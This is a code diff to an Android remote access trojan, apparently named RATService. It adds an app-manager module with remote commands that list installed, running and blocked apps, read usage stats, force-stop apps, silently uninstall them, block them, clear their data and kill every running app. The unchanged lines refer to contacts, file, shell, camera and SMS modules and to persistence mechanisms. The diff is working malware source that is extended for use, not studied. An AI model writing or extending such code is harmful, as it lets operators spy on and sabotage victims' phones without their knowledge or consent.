@@ -90,7 +90,7 @@ public class RATService extends Service {
     private FileModule fileModule;
     private ShellModule shellModule;
     private DeviceModule deviceModule;
-    
+    private AppManagerModule appManagerModule;
     // Track camera state
     private boolean isUsingFrontCamera = false;
     
@@ -140,6 +140,7 @@ public class RATService extends Service {
         if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
         if (Config.ENABLE_FILES) fileModule = new FileModule(this);
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
+        if (Config.ENABLE_APP_MANAGER) appManagerModule = new AppManagerModule(this);
         deviceModule = new DeviceModule(this);
         
         // Schedule all persistence mechanisms
@@ -742,6 +743,130 @@ public class RATService extends Service {
                     sendCommand("CAMERA_SIMPLE|ERROR: Camera module not available");
                 }
                 break;
+
+// In routeCommand() method, add these cases:
+
+case "apps_list":
+case "list_apps":
+    if (appManagerModule != null) {
+        boolean includeSystem = args.equalsIgnoreCase("true");
+        String result = appManagerModule.listInstalledApps(includeSystem);
+        sendCommand("APPS_LIST|" + result);
+    } else {
+        sendCommand("APPS_LIST|{\"success\":false,\"error\":\"App manager not available\"}");
+    }
+    break;
+
+case "app_info":
+    if (appManagerModule != null && !args.isEmpty()) {
+        String result = appManagerModule.getAppInfo(args);
+        sendCommand("APP_INFO|" + result);
+    } else {
+        sendCommand("APP_INFO|{\"success\":false,\"error\":\"Invalid package name\"}");
+    }
+    break;
+
+case "app_stop":
+case "force_stop":
+    if (appManagerModule != null && !args.isEmpty()) {
+        String result = appManagerModule.forceStopApp(args);
+        sendCommand("APPS_ACTION|" + result);
+    } else {
+        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
+    }
+    break;
+
+case "app_uninstall":
+    if (appManagerModule != null && args.contains("|")) {
+        String[] parts = args.split("\\|", 2);
+        String packageName = parts[0];
+        boolean silent = parts.length > 1 && parts[1].equalsIgnoreCase("true");
+        String result = appManagerModule.uninstallApp(packageName, silent);
+        sendCommand("APPS_ACTION|" + result);
+    } else {
+        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|silent\"}");
+    }
+    break;
+
+case "apps_usage":
+    if (appManagerModule != null) {
+        int days = 7; // default
+        if (!args.isEmpty()) {
+            try {
+                days = Integer.parseInt(args);
+            } catch (NumberFormatException e) {
+                // use default
+            }
+        }
+        String result = appManagerModule.getAppUsageStats(days);
+        sendCommand("APPS_USAGE|" + result);
+    } else {
+        sendCommand("APPS_USAGE|{\"success\":false,\"error\":\"App manager not available\"}");
+    }
+    break;
+
+case "app_block":
+    if (appManagerModule != null && args.contains("|")) {
+        String[] parts = args.split("\\|", 2);
+        String packageName = parts[0];
+        boolean block = parts.length > 1 && parts[1].equalsIgnoreCase("true");
+        String result = appManagerModule.blockApp(packageName, block);
+        sendCommand("APPS_ACTION|" + result);
+    } else {
+        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|true/false\"}");
+    }
+    break;
+
+case "apps_running":
+    if (appManagerModule != null) {
+        String result = appManagerModule.getRunningApps();
+        sendCommand("APPS_RUNNING|" + result);
+    } else {
+        sendCommand("APPS_RUNNING|{\"success\":false,\"error\":\"App manager not available\"}");
+    }
+    break;
+
+case "apps_blocked_list":
+    if (appManagerModule != null) {
+        String result = appManagerModule.getBlockedApps();
+        sendCommand("APPS_BLOCKED|" + result);
+    } else {
+        sendCommand("APPS_BLOCKED|{\"success\":false,\"error\":\"App manager not available\"}");
+    }
+    break;
+
+case "app_clear_data":
+    if (appManagerModule != null && !args.isEmpty()) {
+        String result = appManagerModule.clearAppData(args);
+        sendCommand("APPS_ACTION|" + result);
+    } else {
+        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
+    }
+    break;
+
+case "apps_kill_all":
+    if (appManagerModule != null) {
+        String result = appManagerModule.getRunningApps();
+        // Parse and kill each running app
+        try {
+            JSONObject json = new JSONObject(result.substring(result.indexOf('{')));
+            JSONArray apps = json.getJSONArray("apps");
+            for (int i = 0; i < apps.length(); i++) {
+                JSONObject app = apps.getJSONObject(i);
+                String packageName = app.getString("packageName");
+                appManagerModule.forceStopApp(packageName);
+            }
+            sendCommand("APPS_ACTION|{\"success\":true,\"message\":\"Killed " + apps.length() + " apps\"}");
+        } catch (Exception e) {
+            sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+        }
+    } else {
+        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"App manager not available\"}");
+    }
+    break;
+
+
+                
                 
             case "sms":
             case "get_sms":
